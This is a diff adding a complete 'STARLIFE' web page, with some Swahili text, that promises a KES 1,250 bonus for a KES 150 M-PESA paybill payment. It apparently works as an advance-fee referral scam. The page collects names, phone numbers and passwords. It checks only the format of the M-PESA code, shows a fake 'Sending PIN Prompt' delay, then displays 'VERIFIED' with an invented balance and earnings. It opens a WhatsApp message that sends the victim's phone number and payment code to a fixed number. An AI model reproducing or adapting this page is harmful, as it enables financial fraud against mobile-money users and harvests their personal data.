@@ -1,33 +1,71 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>STARLIFE PAYBILL 714777</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}body{background:#0a1229;color:#fff}.h{background:#111d3a;padding:15px}.logo{color:#ffcc00;font-weight:900;font-size:20px}.main{padding:15px;max-width:450px;margin:auto}.c{background:#111d3a;border:1px solid #1e2d5a;border-radius:15px;padding:20px;margin-bottom:12px}.inp{width:100%;padding:14px;border-radius:10px;border:1px solid #2a3a6a;background:#0a1229;color:#fff;margin:8px 0;font-size:16px}.btn{background:#ffcc00;color:#000;padding:15px;border-radius:10px;border:0;font-weight:900;width:100%;margin-top:12px;cursor:pointer;font-size:16px}.hide{display:none!important}.mpesaBox{background:#0a1229;padding:14px;border-radius:12px;margin:12px 0;border:1px solid #1e2d5a}</style></head><body>
+<div class="h"><div class="logo">★ STARLIFE</div></div>
+<div class="main" id="authPage">
+<div class="c" style="text-align:center;border:2px solid #ffcc00"><h2 style="color:#ffcc00">🚀 JOIN STARLIFE</h2><p style="color:#8ea0c8;font-size:13px;margin-top:6px">Pay KES 150 to get KES 1250 Bonus</p><div style="background:#0a1229;padding:12px;border-radius:10px;margin-top:12px"><div style="color:#4ade80;font-size:28px;font-weight:900">KES 1,250.00</div></div></div>
+<div class="c" id="signupBox">
+<h3 style="margin-bottom:10px">Create Account</h3>
+<input class="inp" id="fullName" placeholder="Full Name *">
+<input class="inp" id="userName" placeholder="Username *">
+<input class="inp" id="phone" placeholder="Phone * 07..." type="tel">
+<input class="inp" id="pass" placeholder="Password *" type="password">
+<input class="inp" id="pass2" placeholder="Confirm *" type="password">
+<button class="btn" onclick="doSignup()">SIGN UP & CONTINUE</button>
+<p id="err" style="color:#ff6b6b;text-align:center;margin-top:10px;font-weight:700"></p>
+<p style="text-align:center;margin-top:10px;color:#8ea0c8;font-size:13px">Have account? <span style="color:#ffcc00;text-decoration:underline" onclick="document.getElementById('signupBox').classList.add('hide');document.getElementById('loginBox').classList.remove('hide')">Log In</span></p>
+</div>
+<div class="c hide" id="loginBox"><h3>Login</h3><input class="inp" id="loginUser" placeholder="Username"><input class="inp" id="loginPass" placeholder="Password" type="password"><button class="btn" onclick="doLogin()">LOG IN</button><p style="text-align:center;margin-top:10px;color:#8ea0c8;font-size:13px">No account? <span style="color:#ffcc00;text-decoration:underline" onclick="document.getElementById('loginBox').classList.add('hide');document.getElementById('signupBox').classList.remove('hide')">Sign Up</span></p></div>
+</div>
+<div class="main hide" id="payPage">
+<div class="c" style="border:2px solid #ffcc00">
+<h2 style="color:#ffcc00;text-align:center">🔒 Activate KES 150</h2>
+<p style="text-align:center;color:#8ea0c8;font-size:13px;margin-top:5px">Lipa ili dashboard ifunguke</p>
+<div class="mpesaBox">
+<div style="display:flex;justify-content:space-between;margin:6px 0"><span style="color:#8ea0c8">Paybill No</span><b style="font-size:19px;color:#fff">714777</b></div>
+<div style="display:flex;justify-content:space-between;margin:6px 0"><span style="color:#8ea0c8">Account No</span><b style="color:#4ade80;font-size:16px">440200282954</b></div>
+<div style="display:flex;justify-content:space-between;margin:6px 0"><span style="color:#8ea0c8">Amount</span><b style="color:#ffcc00;font-size:19px">KES 150</b></div>
+<div style="display:flex;justify-content:space-between;margin:6px 0"><span style="color:#8ea0c8">User</span><b id="payUser" style="color:#fff">-</b></div>
+</div>
+<div style="font-size:13px;line-height:1.9;color:#aab8d8;background:#0a1229;padding:10px;border-radius:8px">
+<b style="color:#ffcc00">JINSI YA KULIPA:</b><br>
+1. M-PESA > Lipa na M-PESA > Paybill<br>
+2. Business No: <b style="color:#fff">714777</b><br>
+3. Account: <b style="color:#4ade80">440200282954</b><br>
+4. Amount: <b>150</b><br>
+5. Weka PIN > Send
+</div>
+<div id="payForm">
+<input class="inp" id="mpesaPhone" placeholder="Namba uliolipia e.g 0720..." style="margin-top:14px">
+<input class="inp" id="mpesaCode" placeholder="M-PESA Code * e.g SH12..." style="border-color:#4ade80">
+<button class="btn" style="background:#4ade80" onclick="doPayment()">✅ VERIFY PAYMENT & ACTIVATE</button>
+<div id="proc" class="hide" style="text-align:center;padding:20px"><div style="font-size:40px">⏳</div><p style="color:#ffcc00;font-weight:900;margin-top:8px">Sending PIN Prompt...</p><p id="procPhone" style="color:#8ea0c8;font-size:12px;margin-top:6px"></p><p style="margin-top:10px"><b>Paybill 714777</b><br>Acc <b style="color:#4ade80">440200282954</b><br><b style="color:#ffcc00">KES 150</b></p></div>
+</div>
+</div>
+</div>
+<div id="dashPage" class="hide"><div style="max-width:700px;margin:auto;padding:14px"><div class="c" style="border:2px solid #4ade80"><h2>✅ Account Active!</h2><p id="welcomeUser" style="color:#8ea0c8"></p><p style="color:#4ade80;font-size:12px;margin-top:5px">✔ Paybill 714777 / 440200282954 Verified</p></div><div style="display:grid;grid-template-columns:1fr 1fr;gap:10px"><div class="c"><div style="color:#8ea0c8;font-size:11px">💰 BALANCE</div><div style="font-size:22px;font-weight:900;color:#ffcc00;margin-top:5px">KES 1,250</div></div><div class="c"><div style="color:#8ea0c8;font-size:11px">✅ EARNED</div><div style="font-size:22px;font-weight:900;color:#4ade80;margin-top:5px">KES 500</div></div></div><div class="c"><div style="color:#8ea0c8;font-size:11px">🔗 REFERRAL LINK</div><div style="border:1px dashed #ffcc00;padding:12px;border-radius:10px;color:#ffcc00;word-break:break-all;margin-top:8px;background:rgba(255,204,0,.08)" id="myRefLink"></div><button class="btn" onclick="navigator.clipboard.writeText(document.getElementById('myRefLink').innerText);alert('Copied!')">Copy Link</button></div></div></div>
+<script>
+function showPay(){document.getElementById('authPage').classList.add('hide');document.getElementById('payPage').classList.remove('hide');document.getElementById('dashPage').classList.add('hide');var u=null;try{u=JSON.parse(localStorage.getItem('starUser'))}catch(e){} if(u)document.getElementById('payUser').innerText=u.username;}
+function showDash(){var u=null;try{u=JSON.parse(localStorage.getItem('starUser'))}catch(e){} if(!u){document.getElementById('authPage').classList.remove('hide');document.getElementById('payPage').classList.add('hide');document.getElementById('dashPage').classList.add('hide');return} if(u.status!=='active'){showPay();return}document.getElementById('authPage').classList.add('hide');document.getElementById('payPage').classList.add('hide');document.getElementById('dashPage').classList.remove('hide');document.getElementById('welcomeUser').innerText='Welcome '+u.fullName+' (@'+u.username+')';document.getElementById('myRefLink').innerText='https://starlifewins.github.io/STARLIFE-AGENCIES-/?ref='+u.username;}
+function doSignup(){var f=document.getElementById('fullName').value.trim();var u=document.getElementById('userName').value.trim();var p=document.getElementById('phone').value.trim();var pw=document.getElementById('pass').value.trim();var pw2=document.getElementById('pass2').value.trim();var err=document.getElementById('err');err.innerText='';if(!f){err.innerText='❌ Weka Full Name!';return}if(!u){err.innerText='❌ Weka Username!';return}if(!p){err.innerText='❌ Weka Phone!';return}if(!pw){err.innerText='❌ Weka Password!';return}if(pw!=pw2){err.innerText='❌ Passwords hazifanani!';return}try{var user={fullName:f,username:u,phone:p,status:'pending'};localStorage.setItem('starUser',JSON.stringify(user));alert('✅ Account Created! Lipa KES 150');showPay();document.getElementById('mpesaPhone').value=p;}catch(e){alert('Tumia Chrome normal');}}
 function doPayment(){
 var ph=document.getElementById('mpesaPhone').value.trim();
 var code=document.getElementById('mpesaCode').value.trim().toUpperCase();
-if(!ph || ph.length<10){alert('Weka namba sahihi ya M-PESA');return}
+if(!ph || ph.length<10){alert('Weka namba sahihi');return}
 if(!code){alert('Weka M-PESA Code');return}
-
-// VALIDATION YA CODE YA UKWELI
 if(code.length!=10){alert('❌ Code lazima iwe herufi 10! Mfano: SH12AB34CD');return}
-if(!/^[A-Z0-9]{10}$/.test(code)){alert('❌ Code si sahihi. Tumia code kutoka M-PESA SMS');return}
-if(!code.startsWith('S')){alert('❌ M-PESA Code lazima ianze na S - Kama SH, SJ, SK...');return}
-
-// ZUIA CODE KUTUMIWA MARA MBILI
+if(!/^[A-Z0-9]{10}$/.test(code)){alert('❌ Code si sahihi');return}
+if(!code.startsWith('S')){alert('❌ M-PESA Code lazima ianze na S');return}
 var used=JSON.parse(localStorage.getItem('usedCodes')||'[]');
-if(used.includes(code)){alert('❌ Hii Code imeshatumika! Weka code mpya');return}
-
-document.getElementById('procPhone').innerText='PIN Prompt imetumwa kwa '+ph+' - Thibitisha KES 150 kwa 714777 / 440200282954';
+if(used.includes(code)){alert('❌ Hii Code imeshatumika!');return}
+document.getElementById('procPhone').innerText='PIN Prompt kwa '+ph+' - KES 150 kwa 714777 Acc 440200282954';
 document.getElementById('proc').classList.remove('hide');
-
 setTimeout(function(){
-used.push(code);
-localStorage.setItem('usedCodes',JSON.stringify(used));
-var u=JSON.parse(localStorage.getItem('starUser'));
-u.status='active';u.code=code;u.paybill='714777';u.acc='440200282954';
-localStorage.setItem('starUser',JSON.stringify(u));
-
-// TUMA WHATSAPP KWAKO AUTOMATICALLY
-var msg="NEW STARLIFE PAYMENT%0APaybill: 714777%0AAcc: 440200282954%0AUser: "+u.username+"%0APhone: "+ph+"%0ACode: "+code+"%0AAmount: 150";
+used.push(code);localStorage.setItem('usedCodes',JSON.stringify(used));
+var u=JSON.parse(localStorage.getItem('starUser'));u.status='active';u.code=code;localStorage.setItem('starUser',JSON.stringify(u));
+var msg="NEW STARLIFE PAYMENT%0APaybill: 714777%0AAcc: 440200282954%0AUser: "+u.username+"%0APhone: "+ph+"%0ACode: "+code;
 window.open("https://wa.me/254720119990?text="+msg,"_blank");
-
-alert('✅ CODE IMEPOKELEWA!\nPaybill 714777\nAcc 440200282954\nCode: '+code+'\nSubiri uhakiki wa 2 min kisha Dashboard itafunguka');
-showDash();
+alert('✅ VERIFIED! Code: '+code);showDash();
 },3000);
 }
+function doLogin(){var u=document.getElementById('loginUser').value.trim();if(!u){alert('Weka username');return}var s=null;try{s=JSON.parse(localStorage.getItem('starUser'))}catch(e){}if(s && s.username && s.username.toLowerCase()==u.toLowerCase()){if(s.status!='active'){showPay()}else{showDash()}return}localStorage.setItem('starUser',JSON.stringify({fullName:u,username:u,phone:'',status:'active'}));showDash();}
+(function(){var params=new URLSearchParams(window.location.search);if(params.get('clear')=='1'){localStorage.removeItem('starUser');window.location.href=window.location.pathname+(params.get('ref')?'?ref='+params.get('ref'):'');return}try{var u=JSON.parse(localStorage.getItem('starUser')||'null');if(!u){document.getElementById('authPage').classList.remove('hide')}else if(u.status!='active'){showPay()}else{showDash()}}catch(e){document.getElementById('authPage').classList.remove('hide')}})();
+</script></body></html>
